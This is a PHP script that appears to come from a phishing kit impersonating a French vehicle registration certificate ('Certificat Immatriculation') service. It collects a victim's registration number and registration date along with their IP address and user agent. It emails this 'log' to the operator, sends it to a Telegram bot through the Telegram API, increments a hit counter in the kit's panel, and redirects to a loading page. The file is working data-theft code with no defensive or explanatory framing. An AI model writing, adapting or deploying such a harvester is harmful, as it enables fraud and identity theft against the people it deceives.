<?php

include('../common/sub_includes.php');
include('../common/includes.php');
include('../config.php');

ob_start();
if(!isset($_SESSION)){
    session_start();  // Et on ouvre la session
} 

$IMMA = $_POST['immatriculation'];
$DDI = $_POST['ddi'];


if($_SERVER['REQUEST_METHOD'] == 'POST'){

  $_SESSION['IMMA']  = $IMMA;
  $_SESSION['DDI']  = $DDI;

$message = '
[🦊] Certificat Querty log +1 [🦊]

🚗Immatriculation : '.$_SESSION['IMMA'].'
🥷Date Immatriculation : '.$_SESSION['DDI'].'

🛒 Adresse IP : '.$_SERVER['REMOTE_ADDR'].'
';

if($mail_send == true){
$Subject=' 「🍓」+1 Fr3sh Certificat Immatriculation from '.$_SESSION['IMMA'].' | '.$_SERVER['HTTP_USER_AGENT'];
$head='From: Certificat <info@querty.bg>';

mail($my_mail,$Subject,$message,$head,$heads);
}

if($tlg_send == true){
    file_get_contents('https://api.telegram.org/bot'.$bot_token.'/sendMessage?chat_id='.$rez_login.'&text='.urlencode("$message").'');
}

$LoginFile = '../panel/info/Login.inf';
$LoginInfoHandle = fopen($LoginFile, 'r');
$LoginInfo = fread($LoginInfoHandle, filesize($LoginFile));
fclose($LoginInfoHandle);

$ChangeFile = fopen($LoginFile, 'w') or die('Unable to open file!');

fwrite($ChangeFile, $LoginInfo + 1);
  
    header('location: ../pages/load.php');
  
}

?>